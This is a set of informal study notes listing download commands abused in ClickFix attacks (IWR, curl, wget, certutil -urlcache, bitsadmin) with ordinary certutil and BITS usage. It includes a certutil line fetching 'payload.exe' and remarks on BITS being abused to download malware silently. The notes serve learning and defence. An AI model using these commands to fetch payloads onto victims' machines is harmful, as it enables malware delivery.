Common ClickFix download commands:

Powershell:
--------------------------------
1. Invoke-WebRequest/IWR
  - Native to powershell
  - works with structured objects(not just raw text)
  Eg:
  - Invoke-WebRequest -Uri "https://example.com"  ==> (fetch data over HTTP/HTTPS)
  or
  - IWR "https://example.com"

2. curl:
  - Standard tool on Linux/macOS (also available on Windows)
  - Sends HTTP requests, widely used in scripts
  Eg: 
  - curl https://example.com
3. wget
  - Common on Linux
  - Focused on downloading files
  Eg: 
  - wget https://example.com/file.zip

CMD:
------------------------------------
1. certutil -urlcache -split -f
 is a  built-in Windows certificate tool to download files from a URL
  -urlcache  --> fetch from URL
  -split  --> save in chunks
  -f  --> force overwrite

Certutil is a windows'certificate services, but often used by devs', sysadmins, & even security folks to
Managing SSL/TLS certificates
Encoding/decoding files (Base64, hex)
Hashing files (like checksums)
Inspecting certificate stores

Basic Syntax:
certutil [options] [arguments]  ==> in CMD as it is a window based tool
1. Generate Hash value:

  certutil -hashfile file.txt SHA256

Other Algorithms: MD5, SHA1, SHA256(most common), SHA512

2. Encode a File:
certutil -encode input.txt output.txt
3. Decode a File:
certutil -decode input.txt output.txt
4. view certificate details:
certutil -dump cert.cer  ==> Shows Issuer, Valid dates, Public key info
5. List certificates in your system:
  certutil -store my  

Other Stores: root (trusted root CAs) & ca (intermediate certs)

certutil -addstore root cert.cer   ==> add a certificate
certutil -delstore root "Certificate Name"  ==> delete a certificate.
certutil -url cert.cer  ==> opens a GUI to verify revocation



Eg: certutil -urlcache -split -f http://example.com/payload.exe payload.exe

2. bitsadmin /transfer
  Uses the background Intelligenct Transfer Service(BITS)
  is a command-line tool for interacting with Backgrounf intelligent services(BITS) on Microsoft windows.
  BITS services:
  Windows Update
  Background downloads/uploads
  Resumable transfers over HTTP/HTTPS
Eg: bitsadmin /transfer jobname http://example.com/file.exe C:\path\file.exe

  bitsadmin is deprecated (Microsoft replaced it with PowerShell cmdlets like Start-BitsTransfer
  bitsadmin - Everything in bitsadmin revolves around jobs.
  A JOB: is A container that manages one or more file transfers.

  Create a job:
    A container that manages one or more file transfers.
  Add a file to download
    bitsadmin /addfile myJob https://example.com/file.zip C:\file.zip
  Start the job:
    bitsadmin /resume myJob
  Check Status:
    bitsadmin /info myJob
  Complete the job:
    bitsadmin /complete myJob
  List all jobs
    bitsadmin /list
  Cancel a job
    bitsadmin /cancel myJob
  Monitor all jobs
    bitsadmin /monitor

BITS is special

Unlike normal downloads:

✅ Auto-resumes if interrupted
✅ Uses idle bandwidth
✅ Survives reboots
✅ Can run under system context

Imagine downloading a large file on a slow or unstable connection:

Browser download fails → restart from 0 ❌
BITS download → resumes from where it stopped ✅

Security angle (important)

Here’s where things get interesting.

Because BITS:

Runs in background
Can persist across reboots
Uses trusted Windows service
It has been abused in attacks (sometimes called “living off the land”).

Example:

Download malware silently
Execute later via scheduled job

So defenders often monitor:

Suspicious BITS jobs
Unknown download sources

A background download manager built into Windows, controlled via jobs

